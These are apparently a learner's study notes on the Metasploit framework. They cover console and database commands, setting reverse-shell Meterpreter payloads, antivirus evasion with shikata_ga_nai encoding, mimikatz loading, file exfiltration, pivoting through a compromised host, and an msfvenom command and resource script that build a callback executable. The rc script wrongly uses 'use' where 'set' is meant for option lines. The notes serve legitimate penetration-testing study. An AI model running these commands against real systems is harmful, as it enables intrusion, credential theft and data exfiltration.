# Metasploit 

> Metasploit, an open-source pentesting framework, is a collectiion of thoroughly tested exploits, auxiliary tools, and post-exploitation tools. It comes by default with Kali Linux 

Initialising Metasploit:
1. Initialise the database -> `msfdb init`
2. Start the console -> `msfconsole`
   - to start the consle without showing the banner/startup information use: `msfconsole -q`
   - to view advanced options for triggering the console: `msfconsole -h`
3. When Metasploit has started, check you've connected to the database -> `db_status`


Core commands:
- `help` or `?` -- to view the help menu (showing all commands)
- `search [module_name]` -- to search for a module
  - to show all modules use: `show [module_category]`
- `use [module_name]` -- to select the module for use 
- `info` -- displays information about the currently selected module 
  - `info [module_name]` -- to display information about another module
- `connect [options] <host> <port>` -- to make a quick connection with a host simply to verify that we can 'talk' to it (i.e. like netcat)
- `set [variable_name]=[value]` -- to change a context-specific variable to a value
  - to change a global variable value use: `setg`
  - to view all variables use: `options`
  - to view a single variable use: `get [variable_name]`
  -  to change the value of a variable to null: `unset [variable_name]`
- `spool` -- to write console output into a file as well as the screen (useful for providing evidence of actions taken)
- `save` -- to save settings/active datastored to a Metasploit settings file (useful to save and then reload set values from a previous Metasploit session)
- `load` -- load a framework pluging (i.e. a module)


Modules:
- Metasploit consist of 6 modules:
  - exploit -- holds the exploit code 
  - payload -- contains the various bits of shellcode you send over once an expoit as executed 
  - auxiliary -- holds tools to scan and verify machines are exploitable 
  - post -- contains tools for post-exploitation (i.e. looting and pivoting)
  - encoder -- holds tools to obfuscate payloads to avoid detection 
  - nop -- tools for performing buffer overflow and ROP attacks


Using Metasploit: bulitin nmap, Metasploit's database, & exploitation:
- Metasploit comes with a built-in way to run nmap and feed it's results directly into our database
  - i.e. `db_nmap -sV 10.10.87.253`
  - Metasploit supports different types of port scans from within the auxiliary modules and can also import other scans from nmap and Nessus just to name a few
- to view the information collected in the database you can use:
  - `hosts` -- to view hosts (targets) stored
  - `services` -- to view the services info. found for the hosts stored 
	  - i.e. to view a specific service `services -p <port_number>`
  - `vulns` -- to view discovered vulnerabilities for the hosts 
  - `creds` -- to show credentials used in successful login attempts
- to use an exploit you can type `use` followed by a unique string found within only the target exploit
  - i.e. `use icecast`
- or you can search for a exploit with `search` and then `use [number_next_to] [exploit/multi/handler]`
  - i.e. `search multi/hanlder` -> `use 6`
- to set the payload for an exploit use `set PAYLOAD`
  - i.e. `set PAYLOAD windows/meterpreter/reverse_tcp`
- and then set the options required by the payload and exploit
  - i.e. `set LHOST 10.10.1.4` -> `set RHOST 10.10.1.35`
  - to view the opitions that need to be set use `options`
- to run the exploit selected enter `exploit` or `run -j` (to run as a job)
- Once started, you can check all of the jobs running on the system by running the command `jobs` or list all your sessions using the `sessions` command 
  - then you can interact with a target session with `sessions -i [session_number]`
  - enter `background` whilst in a meterpreter session to background the session and return to the msfconsole 

Payloads:
> Metasploit has two payload types: staged and non-staged. A non-staged payload is sent in its entirety along with the exploit. In contrast, a staged payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

> Use a staged payload when you don't have enough buffer space to hold the full payload and when trying to evade AV.


Using Metasploit: post-exploitation:
- if you are able to get a metepreter shell on a system you can view it's builtin post-exploitation commands with the `help` or `?` command
- first you want to stablise your initial shell/process by moving to a different (more stable) one:
  1. list the running processes with `ps`
  2. transfer to another running process with `migrate [pid]`
  - this may not work if you don't have sufficient privileges
- try to escalate privileges:
  - find out more information about the system so you know how you can escalate privileges help:
    - `getuid` -- to get the user that the process is running under
    - `sysinfo` -- to get info. about the remote system 
    - `ipconfig` -- to get networking info. about the remote system
  - use meterpreter post-exploitation extensions:
    - `load [extension]` -- to load one or more meterpreter extensions
    - i.e. `load kiwi` to load newest version of mimikatz
    - i.e. `load powershell` to use PowerShell commands
  - `getprivs` -- to get the privileges the current user has 
  - `upload [src] [dst]` -- to upload a file to the remote system (i.e. a privilege escalation tool)
  - `download [src] [dst]` -- to download a file to the attack system (i.e. to exfiltrate data
- run meterpreter post-exploitation modules against target:
  - `run [script] [args]` -- to run a Metasploit post-exploitation module 
  - i.e. `run post/windows/gather/checkvm` -- to determine if we're in a VM (a very useful piece of knowledge for further pivoting)
  - i.e. `run post/multi/recon/local_exploit_suggester` -- to check for various exploits which we can run within our session to elevate our privileges
  - i.e. `run post/windows/manage/enable_rdp` -- to force RDP to be avalible (only works if you have admin privileges)
- use `shell` get a normal system shell


Metasploit autorouting options:
- to pull up the help menu for the autoroute module use: `run autoroute -h`
- `run autoroute -s 172.18.1.0 -n 255.255.255.0` -- add a route to the 172.18.1.0/24 subnet
- you can use the victim machine as a sock5 server
  - find the socks5 server auxiliary module (i.e. `search server/socks4a`)
  - start the proxy server on the target machine 
  - modify your "/etc/proxychains.conf" file to include the new server 
  - run commands through the socks5 proxy server by prefixing commands (outside of Metasploit) with `proxychains [cmd/program]`


Advanced features and transports:
- to show advanced options: `show advanced`
- to encode all stages of the exploit payload sent: 
	- i.e. in exploit (or multi/handler) `set EnableStageEncoding true` -> `set StageEncoder x86/shikata_ga_nai` -> `exploit -j`
	- this gives a better chance of bypassing AV detection 
- to automatically run a script when a meterpreter connection is established use the `AutoRunScript` option:
	- i.e. in exploit (or multi/handler) `set AutoRunScript windows/gather/enum_logged_on_users` -> `exploit -j`
- to switch protocols after an initial compromise use Meterpreter's `transport` option:
	- to list currently available transports: `transport list`
	- to add a new transport protocol to the current session: `transport add -t <transport_method> -l <local_ip> -p <local_port>`
	- i.e. `transport add -t reverse_tcp -l 10.11.0.4 -p 5555`
	- before you can use this new transport, you need to setup a listener to accept the connection (i.e. using `multi/handler` and specifying the parameters used)
	- once the handler is configured you can return to the meterpreter session and run `transport next` to change to the newly-created transport mode, which will create a new session and close down the old one 

Metasploit automation:
- you can take advantage of Metasploit's resource scripts which let pre-define Metasploit commands to run 
- i.e. setup.rc:
	```rc
	use exploit/multi/handler
	use PAYLOAD windows/meterpreter/reverse_https
	use LHOST 10.11.0.4
	use LPORT 443
	use EnableStageEncoding true
	use StageEncoder x86/shikata_ga_nai
	use AutoRunScript post/windows/manage/migrate
	set ExitOnSession false
	exploit -j -z
	```
- once you've created a script you can execute it by passing the `-r` flag to `msfconsole` (i.e. `sudo msfconsole -r setup.rc`)
- with a listener configured and running, you can launch an executable containing a meterpreter payload (created with `msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443 -f exe -o met.exe`) and the multi/handler will accept the connection
- 
